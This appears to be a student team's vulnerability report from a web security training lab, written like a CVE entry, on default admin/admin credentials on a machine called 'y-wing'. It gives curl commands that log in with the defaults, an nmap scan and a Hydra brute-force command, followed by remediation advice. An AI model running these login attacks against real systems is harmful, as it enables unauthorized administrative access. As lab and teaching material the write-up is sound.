CVE-ID: EDU-WEBLAB-2026-T02-004

Title:    Default Weak Credentials (admin/admin) Allowing Full Administrative Authentication Bypass

Affected Lab:    y-wing

Component:    Web Application Authentication — Administrative Login Interface

Severity:    Critical

CVSS Vector:    CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

CVSS Score:    9.8

Description:
A critical weak credentials vulnerability was identified in the administrative login interface of the y-wing machine, where the application accepts the default username and password combination of `admin/admin` without enforcing any credential hardening or account lockout policy. This vulnerability exists due to the failure to change factory-default credentials during deployment, representing a fundamental breakdown in the system's authentication security posture. Because no authentication complexity or brute-force protection is in place, an unauthenticated remote attacker can gain full administrative access to the application instantly, without requiring any specialized tools or exploitation techniques. Successful exploitation grants the attacker complete control over the administrative interface, enabling unauthorized data access, configuration changes, privilege escalation, and potential lateral movement to other connected systems within the environment. The trivial nature of exploitation combined with the critical level of access granted makes this one of the most severe vulnerability classes an application can exhibit in a networked environment.

Proof of Concept:  bash

Step 1: Confirm the login endpoint is accessible
curl -s -o /dev/null -w "%{http_code}" http://<target-ip>/login

Step 2: Authenticate using default credentials via curl
curl -s -X POST http://<target-ip>/login \
-d "username=admin&password=admin" \
-c session.txt \
-L

Step 3: Confirm authenticated session by accessing a protected admin resource
curl -s http://<target-ip>/admin/dashboard \
-b session.txt

Step 4 (Alternative): Use Hydra to demonstrate trivial brute-force success
hydra -l admin -p admin <target-ip> http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials" -V


Steps to Reproduce:
1. Launch Kali Linux and perform a service scan against the y-wing machine to identify the web application port and confirm the login interface is accessible: `nmap -sV -p 80,443,8080 <target-ip>`
2. Open a web browser and navigate to the application's login page: `http://<target-ip>/login`
3. In the username field, enter `admin`
4. In the password field, enter `admin`
5. Click the    Login    or    Sign In    button to submit the credentials
6. Observe that authentication succeeds immediately and the application redirects to the administrative dashboard without any additional verification or challenge
7. Navigate through the administrative interface and confirm that full administrative privileges are granted, including access to user management, system configuration, and sensitive application data
8. Open a terminal and confirm the authentication programmatically using curl: `curl -s -X POST http://<target-ip>/login -d "username=admin&password=admin" -c session.txt -L`
9. Access a protected administrative endpoint using the captured session cookie to verify persistent authenticated access: `curl -s http://<target-ip>/admin/dashboard -b session.txt`
10. Confirm complete administrative compromise by verifying that sensitive configuration, user data, or system controls are fully accessible under the `admin` account

Remediation:
1.    Immediately change all default credentials    — replace the `admin/admin` username and password combination with a strong, unique password of at least 16 characters containing uppercase, lowercase, numbers, and special characters, and consider renaming the default admin username to a non-guessable value
2. Enforce a strong password policy at the application level that mandates minimum password length (≥12 characters), complexity requirements, and prevents the use of common or previously breached passwords by integrating against a known password blocklist (e.g., the HaveIBeenPwned API or a local dictionary blocklist)
3. Implement account lockout or progressive rate-limiting after a defined number of failed login attempts (e.g., lock account for 15 minutes after 5 consecutive failures) to prevent brute-force and credential stuffing attacks
4. Enable Multi-Factor Authentication (MFA) for all administrative accounts to ensure that compromised credentials alone are insufficient for gaining access
5. Restrict access to the administrative login interface by IP allowlist or require VPN connectivity, ensuring it is not exposed to the open internet or untrusted network segments
6. Implement a forced credential change mechanism that requires any default or first-time account to set a new password upon initial login, preventing deployment with factory defaults
7. Integrate centralized authentication where feasible (e.g., LDAP, Active Directory, or an OAuth/OIDC provider) to leverage enterprise-grade credential management and auditing capabilities
8. Enable and monitor authentication audit logs, configuring alerts for repeated failed login attempts, logins from unexpected IP addresses, or successful logins outside of normal operational hours to detect credential abuse in real time

Discovered By:    Team 2

Date:    February 20, 2026
